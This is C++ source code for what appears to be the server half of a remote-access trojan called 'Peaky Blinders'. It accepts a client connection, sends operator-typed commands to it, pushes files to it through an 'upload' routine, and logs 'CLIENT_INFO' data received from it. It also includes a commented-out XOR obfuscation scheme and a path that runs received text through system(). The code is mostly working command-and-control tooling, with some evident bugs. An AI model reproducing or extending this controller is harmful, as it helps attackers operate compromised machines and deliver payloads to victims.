// Peaky_Blinders_Sever.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <WinSock2.h>
#include <WS2tcpip.h>
#include <IPHlpApi.h>
#include <stdio.h>
#include <iostream>
#include <string>
#include <fstream>

#pragma comment(lib, "WS2_32.lib")

class Socks {
protected:
	WSADATA wsaData;
	SOCKET ListenSocket;
	SOCKET ClientSocket;

public:
	Socks();
	~Socks();
	void resolve(addrinfo **info);
	void createNbind(addrinfo **info);
	void startlistening();
	void accept_connections();
	void endclient();
	int send_msg();
	int receive(int flag);
	bool sendFile(std::string);
};

Socks::Socks() {
	int iResult = 0; //initialization result
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0)
	{
		printf_s("Socket Initialization: %d\n", iResult);
		//system("pause");
		WSACleanup();
		exit(1);
	}
}

Socks::~Socks() {
	WSACleanup();
}

//resolves address and port
void Socks::resolve(addrinfo **info) {
	struct addrinfo hints;
	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	int result = getaddrinfo("localhost", "80", &hints, info);
	if (result != 0) {
		printf("getaddrinfo failed with error: %d\n", result);
		WSACleanup();
		exit(2);
	}
}

//create a SOCKET for server and bind it
void Socks::createNbind(addrinfo **info) {
	ListenSocket = INVALID_SOCKET;
	addrinfo *result = *info;
	ListenSocket = socket(result->ai_family,
		result->ai_socktype, result->ai_protocol);
	if (ListenSocket == INVALID_SOCKET) {
		printf("socket failed with error: %ld\n", WSAGetLastError());
		freeaddrinfo(result);
		WSACleanup();
		exit(3);
	}

	int res = 0;
	res = bind(ListenSocket, result->ai_addr, (int)result->ai_addrlen);
	if (res == SOCKET_ERROR) {
		printf("listen failed with error: %d\n", WSAGetLastError());
		closesocket(ListenSocket);
		WSACleanup();
		exit(4);
	}
}

//listen on server
void Socks::startlistening() {
	int result = listen(ListenSocket, SOMAXCONN);
	if (result == SOCKET_ERROR) {
		printf("listen failed with error: %d\n", WSAGetLastError());
		closesocket(ListenSocket);
		WSACleanup();
		exit(5);
	}
}

//accept connections on server
void Socks::accept_connections() {
	ClientSocket = INVALID_SOCKET;
	ClientSocket = accept(ListenSocket, NULL, NULL);
	if (ClientSocket == INVALID_SOCKET) {
		printf("accept failed: %d\n", WSAGetLastError());
		closesocket(ListenSocket);
		WSACleanup();
		exit(6);
	}
}

//close socket
void Socks::endclient() {
	closesocket(ClientSocket);
	WSACleanup();
}

//send a message to the client
int Socks::send_msg() {
	int result = 0;
	std::string directory = "";
	std::string msg = "";
	std::string peaky = "enCRAPtion";
	int peaky_len = peaky.length();
	std::cout << "Enter Command: ";
	std::cin >> msg;
	int msg_len = msg.length();

	if (msg == "upload")
	{
		//check if the file exists
		while (true) {
			directory.clear();
			std::cout << "Enter full path to file: ";
			std::cin >> directory;
			std::ifstream isfile(directory.c_str());
			if (!isfile.is_open())
			{
				printf("File NOT found!\n\n");
			}
			else{
				printf("File found!\n");
				isfile.close();
				sendFile(directory);		//We have an existing file to transfer to the client
											//SendFile function will implement it's own flow, exiting the send_msg function
				break;
			}
		}
	}
	else {
		/*for (int i = 0, x = 0; i < msg_len; i++, x++) {
			if (x >= peaky_len) {
				x = 0;
			}
			msg[i] = msg[i] ^ peaky[x];
		}
		printf("Encrypted string: %s\n", msg.c_str());
		*/
	}
		result = send(ClientSocket, msg.c_str(), msg.length(), 0);
		if (result == SOCKET_ERROR) {
			printf("send failed: %d\n", WSAGetLastError());
			closesocket(ClientSocket);
			WSACleanup();
			return 7;
		}
		else {
			receive(1);
		}

	return 0;
}

//receive message from client
int Socks::receive(int flag) {
	int result = 0;
	char recvbuf[4000];
	std::string msg = "";
	std::string peaky = "enCRAPtion";
	int peaky_len = peaky.length();

	result = recv(ClientSocket, recvbuf, 4000, 0);
	

	if (result > 0) {
		//parse actual data from message
		for (int i = 0; i < 4000; i++) {
			if (recvbuf[i] > 0)
				msg = msg + recvbuf[i];
		}
		//printf("Sent from client: %s \n", msg.c_str());
		//decrypt
		//int msg_len = msg.length();
		/*for (int i = 0, x = 0; i < msg_len; i++, x++) {
			if (x >= peaky_len) {
				x = 0;
			}
			msg[i] = msg[i] ^ peaky[x];
		}*/
		//printf("WE JUST DECRYPTED\n\n");
		//check commands
		if (msg.find("CLIENT_INFO") != -1) {
			printf("%s\n", msg.c_str());
			return 0;
		}

		printf("Unencrypted message from client: %s\n", msg.c_str());
		//execute command if flag is set
		if (flag == 0) {
			system(msg.c_str());
		}
	}
	else if (result == 0)
		printf("Connection closed\n");
	else
		printf("recv failed: %d\n", WSAGetLastError());

	return 0;
}

bool Socks::sendFile(std::string directory)
{
	std::string line;
	int result = 0;
	std::string peakyPass = "enCRAPtion";
	const int CHUNK = 1500; 
	int peaky_len = peakyPass.length();
	
	////////////////////////////////////
	// Send "upload" command to prompt client to recv data in new recv function
	///////////////////////////////////
	std::string upload = "upload";
	int up_len = upload.length();
	
	//printf("Plaintext String:  %s\n", upload.c_str());
	/*for (int i = 0, x = 0; i < up_len; i++, x++) {
		if (x >= peaky_len) {
			x = 0;
		}
		upload[i] = upload[i] ^ peakyPass[x];
	} */
	printf("Encrypted string: %s\n", upload.c_str());
	result = send(ClientSocket, upload.c_str(), up_len, 0); //send encrypted full path filename
	if (result == SOCKET_ERROR) {
		printf("send failed: %d\n", WSAGetLastError());
		closesocket(ClientSocket);
		WSACleanup();
		return 7;
	}

	////////////////////////////////////
	// RECIEVE RESPONSE "OKAY" FROM CLIENT
	////////////////////////////////////
	receive(1);
	//printf("RECVD MESSAGE FROM THE CLIENT^^^^\n\n");

	////////////////////////////////////
	// Send the Filename to the client
	////////////////////////////////////
	int dir_len = directory.length();
	printf("Length of the filename:  %i\n", dir_len);
	//printf("Plaintext String:  %s\n", directory.c_str());
	/*for (int i = 0, x = 0; i < dir_len; i++, x++) {
		if (x >= peaky_len) {
			x = 0;
		}
		directory[i] = directory[i] ^ peakyPass[x];
	} */
	//printf("Encrypted string: %s\n", directory.c_str());

	result = send(ClientSocket, directory.c_str(), directory.length(), 0); //send encrypted full path filename
	if (result == SOCKET_ERROR) {
		printf("send failed: %d\n", WSAGetLastError());
		closesocket(ClientSocket);
		WSACleanup();
		return 7;
	}

	////////////////////////////////////
	// RECIEVE RESPONSE "OKAY" FROM CLIENT
	////////////////////////////////////
	receive(1);
	//printf("RECVD MESSAGE FROM THE CLIENT^^^^\n\n");


	////////////////////////////////////
	// Start sending file data to client
	////////////////////////////////////
	std::fstream myfile(directory.c_str(),  std::fstream::in);

	//if (myfile)
	//	printf("file successfully opened, reading now....\n");
	//while (std::getline(myfile, line))
	//	std::cout << line << "\n\n";
	myfile.seekg(0, myfile.end);
	unsigned int filesize = myfile.tellg(); 
	//std::cout << filesize << "\t<---- filesize\n\n";
	char *fileBuf = new char[filesize];
	myfile.seekg(0, std::fstream::beg);
	myfile.read(fileBuf, filesize);
	myfile.close();

	unsigned int bytesSent = 0;
	int bytesToSend = 0;
	result = 0;
	while (bytesSent < filesize)
	{
		if ((filesize - bytesSent) >= CHUNK)
			bytesToSend = CHUNK;
		else
			bytesToSend = filesize - bytesSent;
		//printf("\nSending the client--->\n %s\n", fileBuf + bytesSent);
		result = send(ClientSocket, fileBuf + bytesSent, bytesToSend, 0);
		bytesSent += bytesToSend;
		//std::cout << "bytes to send---->" << bytesToSend << "\n";
		std::cout << "filesize--------->" << filesize << "\n";
		std::cout << "bytes sent------->" << bytesSent << "\n";
		
	}
	const char* eof = "EOF";
	memset(fileBuf, 0, sizeof(fileBuf));
	send(ClientSocket, eof, 4, 0);
	printf("Return to main\n");
	//printf("OUTSIDE OF THE SEND LOOP\n\n");
	return true;

}

int main()
{
	//variable declarations
	Socks serv_sock;
	addrinfo *info_ptr = NULL;

	//connection management
	serv_sock.resolve(&info_ptr);
	serv_sock.createNbind(&info_ptr);
	freeaddrinfo(info_ptr);
	serv_sock.startlistening();
	serv_sock.accept_connections();
	serv_sock.receive(1);
	serv_sock.send_msg();
	//
	//serv_sock.receive(0);
	int temp = 0;
	std::cin >> temp;
    return 0;
}
